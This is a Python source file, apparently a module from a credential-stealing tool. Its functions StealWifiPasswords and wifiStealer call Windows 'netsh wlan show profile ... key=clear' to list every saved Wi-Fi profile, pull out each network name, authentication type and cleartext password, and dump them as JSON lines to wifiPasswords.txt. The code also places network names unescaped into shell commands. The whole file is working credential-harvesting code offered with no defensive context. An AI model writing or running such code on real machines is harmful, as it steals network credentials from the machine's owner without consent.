import json
import re
import subprocess


def StealWifiPasswords():
    Result = []
    chcp = 'chcp 65001 && '
    Networks = subprocess.check_output(f'{chcp}netsh wlan show profile',
                                       shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    Networks = Networks.decode(encoding='utf-8', errors='strict')
    NetworkNamesList = re.findall('(?:Profile\\s*:\\s)(.*)', Networks)

    for NetworkName in NetworkNamesList:
        CurrentResult = subprocess.check_output(f'{chcp}netsh wlan show profile "{NetworkName}" key=clear',
                                                shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        CurrentResult = CurrentResult.decode(encoding='utf-8', errors='strict')

        SSID = re.findall('(?:SSID name\\s*:\\s)(.*)', str(CurrentResult))[0].replace('\r', '').replace('"', '')
        Authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
        Password = re.findall('(?:Key Content\\s*:\\s)(.*)', CurrentResult)
        if len(Password) == 0:
            Password = None
        else:
            Password = Password[0][:-1]
        WiFi = {
            'Wifi_Name': SSID,
            'AUTH': Authentication,
            'Password': Password
        }
        Result.append(json.dumps(WiFi) + '\n')

    return Result

def wifiStealer():
    file = open('wifiPasswords.txt', 'w')
    for item in StealWifiPasswords():
        file.write('%s\n' % item)

    file.close()